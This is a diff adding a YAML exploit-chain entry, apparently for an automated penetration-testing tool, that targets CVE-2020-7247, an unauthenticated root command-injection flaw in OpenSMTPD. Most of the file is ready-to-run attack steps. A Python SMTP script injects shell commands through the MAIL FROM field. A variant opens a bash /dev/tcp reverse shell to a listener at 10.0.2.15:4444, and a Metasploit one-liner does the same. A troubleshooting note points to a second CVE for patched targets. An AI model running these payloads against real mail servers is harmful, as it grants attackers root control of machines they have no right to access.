@@ -1,0 +1,73 @@
+chain_id: opensmtpd_cve_2020_7247
+title: "OpenSMTPD — CVE-2020-7247 unauth RCE as root via MAIL FROM"
+severity: CRITICAL
+tags: [smtp, opensmtpd, cve-2020-7247, rce, openbsd]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2020-7247" }
+    - { banner_pattern: "(?i)opensmtpd" }
+    - { product_pattern: "(?i)opensmtpd" }
+
+description: |
+  OpenSMTPD < 6.6.2p1 (default MTA on OpenBSD, ships in many BSD/Linux
+  distros): a crafted local-part in `MAIL FROM:` survives sanitization
+  and is passed unescaped to `execvp("/bin/sh", ...)` when the message
+  is locally delivered. Result: unauth RCE as root in a single SMTP
+  conversation. Qualys disclosure, Jan 2020.
+
+steps:
+  - id: 1
+    title: "Confirm OpenSMTPD banner"
+    command: |
+      nc -nv $VICTIMA 25
+      # Expect: 220 host ESMTP OpenSMTPD
+
+  - id: 2
+    title: "One-shot id (writes output to /tmp/rootctl)"
+    command: |
+      python3 - <<'PY'
+      import socket
+      s=socket.create_connection(("$VICTIMA",25)); r=lambda:print(s.recv(4096).decode().rstrip())
+      r()
+      def send(c): s.sendall(c.encode()+b"\r\n"); r()
+      send("HELO rootctl")
+      send('MAIL FROM:<;sleep 5;id>/tmp/rootctl.txt;>')
+      send("RCPT TO:<root>")
+      send("DATA")
+      s.sendall(b"From: a\r\nTo: b\r\nSubject: x\r\n\r\nrootctl\r\n.\r\n")
+      r(); send("QUIT")
+      PY
+
+  - id: 3
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444
+      python3 - <<'PY'
+      import socket
+      s=socket.create_connection(("$VICTIMA",25)); s.recv(4096)
+      def send(c): s.sendall(c.encode()+b"\r\n"); s.recv(4096)
+      send("HELO rootctl")
+      send('MAIL FROM:<;sleep 5;bash -i >& /dev/tcp/10.0.2.15/4444 0>&1;>')
+      send("RCPT TO:<root>")
+      send("DATA")
+      s.sendall(b"x\r\n.\r\n"); s.recv(4096); send("QUIT")
+      PY
+
+  - id: 4
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/unix/smtp/opensmtpd_mail_from_rce; \
+        set RHOSTS $VICTIMA; set RPORT 25; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+common_errors:
+  - error: "550 Sender address rejected"
+    solution: |
+      Patched (≥ 6.6.2p1) or AntiSpam policy strips angle brackets.
+      Try CVE-2020-8794 (the read primitive variant) — same banner
+      window, different gadget.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2020-7247
+  - https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-and-rce-in-opensmtpd-default-install.txt
